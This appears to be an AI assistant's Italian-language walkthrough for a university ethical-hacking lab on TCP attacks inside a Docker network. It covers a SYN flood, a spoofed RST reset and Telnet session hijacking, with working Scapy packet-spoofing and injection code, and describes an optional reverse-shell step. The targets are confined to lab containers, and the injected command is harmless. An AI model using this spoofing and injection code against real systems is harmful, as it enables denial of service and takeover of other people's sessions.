Ho analizzato /home/alessandrovulcu/Documenti/Università/Ethical-hacking/Lab2 - TCPSpoofing/TCPSpoofing_Readme.pdf e [docker-compose.yml](/home/alessandrovulcu/Documenti/Università/Ethical-hacking/Lab2 - TCPSpoofing/Labsetup/docker-compose.yml). Configurazione Compose valida; container del lab **non ancora avviati**. Avviso `version is obsolete` innocuo.

|Ruolo|Container|IP|
|---|---|---|
|Attaccante|`seed-attacker`|Rete host; verificare indirizzo|
|Vittima Telnet|`victim-10.9.0.5`|`10.9.0.5`|
|Client|`user1-10.9.0.6`|`10.9.0.6`|
|Secondo client|`user2-10.9.0.7`|`10.9.0.7`|

Esegui attacchi **solo sulla rete Docker del lab**. Procediamo per prove, registrando risultato di ciascuna.

### 1. Avvio e controllo

Dalla cartella corrente:

```
docker compose -f Labsetup/docker-compose.yml up -d
docker compose -f Labsetup/docker-compose.yml ps
docker network inspect net-10.9.0.0 --format '{{json .IPAM.Config}}'
docker exec victim-10.9.0.5 sysctl net.ipv4.tcp_syncookies net.ipv4.tcp_max_syn_backlog
docker exec victim-10.9.0.5 ss -lnt
```

Verifica porta `23` in ascolto. Test Telnet:

```
docker exec -it user1-10.9.0.6 telnet 10.9.0.5
```

Credenziali previste dal PDF: `seed` / `dees`. Esci da Telnet prima delle prove successive.

### 2. Task 1 — SYN flood

Nel file montato [synflood_draft.py](/home/alessandrovulcu/Documenti/Università/Ethical-hacking/Lab2 - TCPSpoofing/Labsetup/volumes/synflood_draft.py), sostituisci righe 7–8:

```
ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags="S")
```

Questo file contiene già `pkt = ip/tcp`. Copia in `Task 1/` manca invece quella riga: usa copia sotto `Labsetup/volumes`.

Prima della prova, azzera memoria dei client già collegati:

```
docker exec victim-10.9.0.5 ip tcp_metrics flush
```

Terminale A, attacco per circa un minuto:

```
docker exec -it seed-attacker bash -lc 'cd /volumes && timeout 70s python3 synflood_draft.py'
```

Terminale B, misura coda:

```
docker exec victim-10.9.0.5 ss -n state syn-recv sport = :23
```

Terminale C, prova collegamento da `user2`:

```
docker exec -it user2-10.9.0.7 telnet 10.9.0.5
```

Annota: numero connessioni `SYN-RECV`, esito Telnet, durata. Se Telnet riesce, possibile causa: Python troppo lento, ritrasmissioni che liberano posti, oppure client già riconosciuto. Ripeti dopo `ip tcp_metrics flush`, poi prova coda più piccola:

```
docker exec victim-10.9.0.5 sysctl -w net.ipv4.tcp_max_syn_backlog=80
```

Per Task 1.2 ripristina prima valore originale annotato al passo 1. Compila programma fornito [synflood.c](/home/alessandrovulcu/Documenti/Università/Ethical-hacking/Lab2 - TCPSpoofing/Labsetup/volumes/synflood.c):

```
docker exec seed-attacker bash -lc 'gcc -o /volumes/synflood /volumes/synflood.c'
docker exec -it seed-attacker bash -lc 'timeout 70s /volumes/synflood 10.9.0.5 23'
```

Ripeti misure e Telnet. Atteso: C invia pacchetti più rapidamente di Scapy; confronto va basato su misure, non solo esito login.

Per Task 1.3 abilita SYN cookies e ripeti prove:

```
docker exec victim-10.9.0.5 sysctl -w net.ipv4.tcp_syncookies=1
```

Atteso: servizio resta più disponibile anche con molti SYN, perché server evita di conservare stato per ogni richiesta sospesa.

### 3. Task 2 — reset connessione Telnet

Apri sessione Telnet `user1 → victim`. Sul container attaccante identifica interfaccia della rete `10.9.0.0/24`:

```
docker exec seed-attacker ip -br addr
```

Cattura traffico Telnet con Wireshark sul bridge corrispondente, oppure:

```
docker exec -it seed-attacker tcpdump -ni any 'tcp and host 10.9.0.5 and host 10.9.0.6 and port 23'
```

Dal flusso ricava porta sorgente del client e **numero di sequenza TCP assoluto** atteso dal server. Con Scapy invia singolo pacchetto `RST` che impersona client:

```
from scapy.all import IP, TCP, send

pkt = IP(src="10.9.0.6", dst="10.9.0.5") / TCP(
    sport=PORTA_CLIENT,
    dport=23,
    flags="R",
    seq=SEQUENZA_ATTESA
)
send(pkt, verbose=0)
```

Esegui script da `/volumes` dentro `seed-attacker`. Successo: sessione Telnet termina. Se resta aperta, controlla porte, direzione e sequenza; cattura nuovo pacchetto perché valori cambiano.

### 4. Task 3 — session hijacking

Nuova sessione Telnet. Cattura pacchetti come sopra. Ricava:

- `sport`: porta effimera client;
- `seq`: prossimo byte atteso dal server dal client;
- `ack`: prossimo byte atteso dal client dal server.

Inietta comando innocuo, verificabile sulla vittima:

```
from scapy.all import IP, TCP, Raw, send

pkt = (
    IP(src="10.9.0.6", dst="10.9.0.5")
    / TCP(sport=PORTA_CLIENT, dport=23, flags="PA",
          seq=SEQ_CLIENT, ack=ACK_SERVER)
    / Raw(load=b"echo LAB_OK > /tmp/tcp_lab_proof\n")
)
send(pkt, verbose=0)
```

Verifica:

```
docker exec victim-10.9.0.5 cat /tmp/tcp_lab_proof
```

Output atteso: `LAB_OK`. Telnet può perdere sincronizzazione dopo iniezione: apri nuova sessione prima di riprovare.

### 5. Task 4 opzionale — reverse shell

PDF chiede riuso tecnica Task 3: listener sull’attaccante, comando shell iniettato come payload Telnet. Prima verifica IP raggiungibile della macchina host dalla vittima; `10.9.0.1` nel PDF è esempio, **non garantito** da Compose. Verifica gateway:

```
docker exec victim-10.9.0.5 ip route
```

Usa quell’IP come destinazione listener. Documenta connessione ricevuta e comando `whoami` nella shell remota. Poi chiudi listener e sessione.

Per iniziare insieme, esegui **passo 1** e incollami output di `docker compose ... ps`, `ip route` dalla vittima e `ss -lnt`: da lì confermiamo rete e porta prima dell’attacco.